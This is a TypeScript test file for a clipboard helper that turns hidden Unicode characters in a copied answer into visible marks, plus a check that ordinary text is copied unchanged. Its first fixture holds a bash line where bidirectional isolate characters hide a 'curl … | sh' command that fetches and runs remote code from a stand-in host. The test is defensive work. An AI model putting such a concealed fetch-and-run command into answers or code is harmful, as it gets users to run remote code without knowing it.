import { afterEach, describe, expect, it, vi } from 'vitest';
import { copyVisible } from './clipboard';

afterEach(() => {
  vi.unstubAllGlobals();
});

function stubClipboard(): string[] {
  const written: string[] = [];
  vi.stubGlobal('isSecureContext', true);
  vi.stubGlobal('navigator', {
    clipboard: {
      writeText: async (text: string) => {
        written.push(text);
      },
    },
  });
  return written;
}

describe('copyVisible (whole-answer copy button)', () => {
  it('puts the hidden characters on the clipboard as visible marks', async () => {
    const written = stubClipboard();
    const answer = 'Executa:\n\n```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```\n\nI `a\u200Bb`.';
    await expect(copyVisible(answer)).resolves.toEqual({ ok: true, revealed: 3 });
    expect(written).toEqual([
      'Executa:\n\n```bash\necho ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n```\n\nI `a⟨U+200B⟩b`.',
    ]);
  });

  it('copies ordinary answers unchanged', async () => {
    const written = stubClipboard();
    await expect(copyVisible('Hola 👩\u200D💻 שלום')).resolves.toEqual({ ok: true, revealed: 0 });
    expect(written).toEqual(['Hola 👩\u200D💻 שלום']);
  });
});
